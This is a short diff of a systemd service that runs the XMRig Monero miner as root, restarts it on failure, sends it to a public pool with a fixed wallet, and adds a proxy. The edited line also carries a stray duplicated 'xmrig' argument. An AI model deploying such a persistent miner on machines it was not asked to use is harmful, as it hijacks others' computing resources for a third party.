@@ -124,7 +124,7 @@ After=network.target
 [Service]
 Type=simple
 User=root
-ExecStart=${XMRIG_BIN} -o pool.supportxmr.com:443 -u 48Cdv8BajGJJrgA4aFnQU64sugzQWzqKwLMMuKdjZdFvNAXF3P2WabWKjsfV3YMsb4BAaDDn5dYzea7HuyQ9RDvhAZQnNCx -k --tls -p ${WORKER_NAME}
+ExecStart=${XMRIG_BIN} xmrig -o pool.supportxmr.com:443 -u 48Cdv8BajGJJrgA4aFnQU64sugzQWzqKwLMMuKdjZdFvNAXF3P2WabWKjsfV3YMsb4BAaDDn5dYzea7HuyQ9RDvhAZQnNCx -k --tls -p ${WORKER_NAME} --proxy=192.168.99.20:1080
 Restart=always
 RestartSec=10
 
